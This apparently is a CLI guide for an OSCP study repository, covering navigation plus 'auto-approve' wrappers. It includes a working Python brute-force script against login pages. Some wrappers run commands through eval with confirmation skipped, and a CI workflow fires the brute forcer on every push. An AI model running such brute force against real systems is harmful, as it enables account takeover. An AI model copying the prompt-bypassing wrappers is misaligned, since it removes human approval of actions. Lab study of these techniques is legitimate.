# CLI & Auto-Approve Guide

Complete guide for accessing all OSCP learning materials through command-line interface with auto-approve configurations.

## Quick Start

```bash
# Navigate to organized materials
cd OSCP-Organized

# View main README
cat README.md

# Access any category
cd 1-Basics
cd 2-Web-Security
cd 3-Network-Security
cd 4-Exploitation
cd 5-Post-Exploitation
cd 6-Tools-Scripts
```

## PowerShell Quick Start (Windows)

```powershell
# Navigate to organized materials
Set-Location -Path "OSCP-Organized"

# View main README
Get-Content README.md | less

# List categories
Get-ChildItem -Directory

# Access a category
Set-Location -Path "2-Web-Security"
```

## Access All Materials - Category Overview

### Navigate and Explore

```bash
# List all categories with descriptions
for dir in 1-Basics 2-Web-Security 3-Network-Security 4-Exploitation 5-Post-Exploitation 6-Tools-Scripts; do
    echo "=== $dir ==="
    ls "$dir" | head -5
    echo ""
done

# PowerShell equivalent
@("1-Basics", "2-Web-Security", "3-Network-Security", "4-Exploitation", "5-Post-Exploitation", "6-Tools-Scripts") | ForEach-Object {
    Write-Host "=== $_ ===" -ForegroundColor Green
    Get-ChildItem $_ -File | Select-Object -First 5 | ForEach-Object { Write-Host $_.Name }
    Write-Host ""
}
```

### View Category README Files

```bash
# View content from any category
cat 1-Basics/README.md
cat 2-Web-Security/README.md
cat 3-Network-Security/README.md
cat 4-Exploitation/README.md
cat 5-Post-Exploitation/README.md
cat 6-Tools-Scripts/README.md

# With pagination (less/more)
less 2-Web-Security/README.md
```

## Auto-Approve Scripts Configuration

### Python Scripts - Auto Configuration

```bash
#!/bin/bash
# setup-python-auto.sh - Auto-configure Python scripts

cd 6-Tools-Scripts

# Install dependencies silently
pip3 install requests -q

# Create wrapper script with auto-approve
cat > bruteforce-auto.sh << 'EOF'
#!/bin/bash
# Auto-configured brute force script

TARGET="${1:-http://[TARGET_IP]}"
USERNAME="${2:-admin}"
WORDLIST="${3:-passwords.txt}"

python3 << PYTHON
import requests
from requests.auth import HTTPBasicAuth
import sys
import time

def try_login(target, username, password):
    try:
        data = {
            'username': username,
            'password': password
        }
        response = requests.post(target, data=data, allow_redirects=False, timeout=10)
        if response.status_code in [301, 302]:
            return True
        body = response.text.lower()
        if any(keyword in body for keyword in ['success', 'welcome', 'dashboard', 'logged in']):
            return True
        if not any(keyword in body for keyword in ['invalid', 'incorrect', 'failed', 'wrong']):
            if len(body) < 500 or 'logout' in body:
                return True
        return False
    except Exception as e:
        return False

target = "$TARGET"
username = "$USERNAME"

print(f"[*] Starting brute force attack against {target}")
print(f"[*] Target username: {username}\n")

with open("$WORDLIST", 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

for i, password in enumerate(passwords, 1):
    print(f"[{i}] Trying: {password}... ", end='', flush=True)
    if try_login(target, username, password):
        print(f"\n[+] SUCCESS! {username}:{password}")
        sys.exit(0)
    print("Failed")
    time.sleep(0.1)

print(f"\n[-] Brute force complete.")
PYTHON
EOF

chmod +x bruteforce-auto.sh
echo "[+] Auto-configured Python script ready"
```

### Go Scripts - Auto Compilation

```bash
#!/bin/bash
# setup-go-auto.sh - Auto-compile Go scripts

cd 6-Tools-Scripts

# Compile Go scripts
go build -o bruteforce-compiled bruteforce.go 2>/dev/null

if [ -f bruteforce-compiled ]; then
    echo "[+] Go binary compiled successfully"
    echo "[+] Usage: ./bruteforce-compiled"
else
    echo "[-] Go compilation failed - ensure Go is installed"
fi
```

## Auto-Approve Command Execution

### Create Auto-Approve Wrapper

```bash
#!/bin/bash
# auto-approve.sh - Execute commands with automatic approval

AUTO_APPROVE=true

run_with_approval() {
    local command="$1"
    local description="${2:-Executing command}"
    
    if [ "$AUTO_APPROVE" = true ]; then
        echo "[*] $description"
        echo "[*] Command: $command"
        echo "[+] Auto-approved (AUTO_APPROVE=true)"
        eval "$command"
    else
        echo "[*] $description"
        echo "[*] Command: $command"
        read -p "Approve? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            eval "$command"
        fi
    fi
}

# Usage examples
run_with_approval "python3 6-Tools-Scripts/bruteforce.py" "Starting brute force"
run_with_approval "go run 6-Tools-Scripts/bruteforce.go" "Running Go brute force"
```

### PowerShell Auto-Approve Version

```powershell
# auto-approve.ps1 - PowerShell auto-approval script

param(
    [switch]$AutoApprove = $true
)

function Invoke-WithApproval {
    param(
        [string]$Command,
        [string]$Description
    )
    
    Write-Host "[*] $Description" -ForegroundColor Yellow
    Write-Host "[*] Command: $Command" -ForegroundColor Cyan
    
    if ($AutoApprove) {
        Write-Host "[+] Auto-approved (AutoApprove=true)" -ForegroundColor Green
        Invoke-Expression $Command
    } else {
        $response = Read-Host "Approve? (y/n)"
        if ($response -eq 'y' -or $response -eq 'Y') {
            Invoke-Expression $Command
        }
    }
}

# Usage
Invoke-WithApproval "python3 6-Tools-Scripts/bruteforce.py" "Starting brute force"
```

## Search and Access - Advanced CLI Usage

### Search Across All Materials

```bash
# Find all SQL injection references
grep -r "SQL Injection\|sql injection" . --include="*.md"

# Find all RCE references
grep -r "RCE\|remote code execution" . --include="*.md"

# Find all CVE references
grep -r "CVE-" . --include="*.md" | sort -u

# Count total files in each category
for dir in */; do 
    echo "$dir: $(find $dir -type f | wc -l) files"
done

# PowerShell search
Select-String -Path "*.md" -Pattern "SQL Injection" -Recurse
```

### Create Search Index

```bash
#!/bin/bash
# Create searchable index

echo "=== OSCP Materials Index ===" > index.txt
echo "" >> index.txt

find . -name "*.md" -type f | while read file; do
    echo "File: $file" >> index.txt
    head -20 "$file" >> index.txt
    echo "" >> index.txt
done

echo "[+] Index created: index.txt"
```

## Batch Operations

### Run All Tools

```bash
#!/bin/bash
# run-all-tools.sh - Batch execution with auto-approve

AUTO_APPROVE=true
RESULTS_DIR="results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$RESULTS_DIR"

echo "[*] Starting batch tool execution"

# Python brute force
if [ "$AUTO_APPROVE" = true ]; then
    echo "[+] Running Python brute force (auto-approved)"
    cd 6-Tools-Scripts
    python3 bruteforce.py > "$RESULTS_DIR/bruteforce_python.log" 2>&1 &
    cd -
fi

# Go brute force
if [ -f "6-Tools-Scripts/bruteforce" ]; then
    echo "[+] Running Go brute force (auto-approved)"
    cd 6-Tools-Scripts
    ./bruteforce > "$RESULTS_DIR/bruteforce_go.log" 2>&1 &
    cd -
fi

echo "[+] Batch execution complete. Results in: $RESULTS_DIR"
```

## Automated Report Generation

```bash
#!/bin/bash
# generate-report.sh - Auto-generate usage report

REPORT_FILE="OSCP-Report-$(date +%Y%m%d).md"

{
    echo "# OSCP Materials Usage Report"
    echo "Generated: $(date)"
    echo ""
    echo "## Directory Structure"
    tree -L 2 || find . -maxdepth 2 -type d | sort
    echo ""
    echo "## File Count by Category"
    for dir in */; do
        count=$(find "$dir" -type f | wc -l)
        echo "- $dir: $count files"
    done
    echo ""
    echo "## Total Statistics"
    echo "- Total files: $(find . -type f | wc -l)"
    echo "- Markdown files: $(find . -name "*.md" | wc -l)"
    echo "- Python scripts: $(find . -name "*.py" | wc -l)"
    echo "- Go scripts: $(find . -name "*.go" | wc -l)"
    echo ""
    echo "## Available Tools"
    ls -la 6-Tools-Scripts/ | grep -E "\.(py|go)$"
} > "$REPORT_FILE"

echo "[+] Report generated: $REPORT_FILE"
```

## Quick Command Reference

### Navigation
```bash
pwd                    # Current directory
ls -la                 # List all files
cd directory           # Change directory
cd ..                  # Go back
tree                   # Tree view (if installed)
```

### File Viewing
```bash
cat filename           # View entire file
head filename          # First 10 lines
tail filename          # Last 10 lines
less filename          # Paginated view
grep pattern file      # Search in file
wc -l filename         # Count lines
```

### Search
```bash
grep -r "pattern" .    # Recursive search
find . -name "*.md"    # Find all markdown
find . -type f         # Find all files
locate keyword         # Quick search (if indexed)
```

### Execution
```bash
python3 script.py      # Run Python
go run script.go       # Run Go
chmod +x script        # Make executable
./script               # Execute
```

### System Info
```bash
whoami                 # Current user
date                   # Current date/time
uname -a               # System info
df -h                  # Disk usage
ps aux                 # Running processes
```

## Environment Variables

### Set Auto-Approve Mode

```bash
# Bash/Linux
export AUTO_APPROVE=true
export SKIP_CONFIRMATION=true
export CLI_MODE=true

# Use in scripts
if [ "$AUTO_APPROVE" = "true" ]; then
    # Execute without asking
fi

# PowerShell
$env:AUTO_APPROVE = "true"
$env:SKIP_CONFIRMATION = "true"

# Use in scripts
if ($env:AUTO_APPROVE -eq "true") {
    # Execute without asking
}
```

## Security Notes

⚠️ **Important Reminders**
- Auto-approve should only be used in lab/testing environments
- Never auto-approve in production systems
- Always review command output
- Maintain audit logs of executed commands
- Keep track of all automation scripts

## Troubleshooting

```bash
# Permission denied errors
chmod +x script.sh
chmod +x bruteforce

# Module not found (Python)
pip3 install requests
pip3 install --upgrade pip

# Go compilation errors
go get -u ./...
go mod tidy

# Command not found
which python3
which go
echo $PATH
```

## Cleanup and Maintenance

```bash
# Remove execution logs
rm -rf results_*

# Clear cache
find . -name "__pycache__" -type d -exec rm -rf {} +
find . -name "*.pyc" -delete

# Reset to clean state
git clean -fd
git reset --hard
```

## Integration with CI/CD

```bash
# GitHub Actions example
name: Auto-Approve OSCP Tools

on: [push]

jobs:
  tools:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'
      - name: Install dependencies
        run: pip install requests
      - name: Run tools (auto-approved)
        env:
          AUTO_APPROVE: true
        run: python3 6-Tools-Scripts/bruteforce.py
```

## Support and Resources

- **Main README**: cat README.md
- **Category Guides**: cat [1-6]-*/README.md
- **Tool Documentation**: cat 6-Tools-Scripts/README.md
- **Common Commands**: grep -r "example\|Usage:" . --include="*.md"
